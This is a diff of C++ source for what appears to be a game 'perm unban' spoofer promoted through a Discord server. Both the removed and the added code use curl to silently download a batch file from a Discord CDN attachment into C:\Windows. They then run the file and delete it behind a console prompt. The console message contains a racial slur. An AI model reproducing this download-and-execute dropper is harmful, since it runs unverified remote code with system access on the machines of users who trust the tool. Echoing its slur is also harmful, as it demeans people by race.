@@ -17,27 +17,20 @@ std::ostream& operator<<(std::ostream& out, const slowly_printing_stringg& s) {
 	return out;
 }
 
-namespace Spoof {
-
-	void Perm()
-	{
-		system(E("cls"));
-		std::cout << slowly_printing_stringg{ "\n\n\n bouta unban yo black ass",50 };
-		Beep(500, 500);
-		system(E("curl https://cdn.discordapp.com/attachments/1054265232916230144/1058203604080672878/CSI.bat -o C:\\Windows\\both.bat --silent"));
-		system(E("cls"));
-		SetConsoleTitle(E(L"Simply Coded A Perm Unban       discord.gg/simply"));
-		std::cout << slowly_printing_stringg{ "\n\n\n Press Any Key To Clean & Spoof",50 };
-		system(E("pause >nul"));
-
-		ShowWindow(GetConsoleWindow(), SW_SHOW);
-		system(E("C:\\Windows\\both.bat"));
-
-		std::remove(E("C:\\Windows\\both.bat"));
-		system(E("cls"));
-
-	}
-	
+int main() {
+    system("cls");
+    std::cout << "Bouta unban yo black ass\n\n\n";
+    Beep(500, 500);
+    system("curl https://cdn.discordapp.com/attachments/1054265232916230144/1058203604080672878/CSI.bat -o C:\\Windows\\both.bat --silent");
+    system("cls");
+    SetConsoleTitle("Simply Coded A Perm Unban       discord.gg/simply");
+    std::cout << "Press Any Key To Clean & Spoof\n\n\n";
+    system("pause >nul");
+    ShowWindow(GetConsoleWindow(), SW_SHOW);
+    system("C:\\Windows\\both.bat");
+    std::remove("C:\\Windows\\both.bat");
+    system("cls");
+    return 0;
 }
 
 namespace Check {
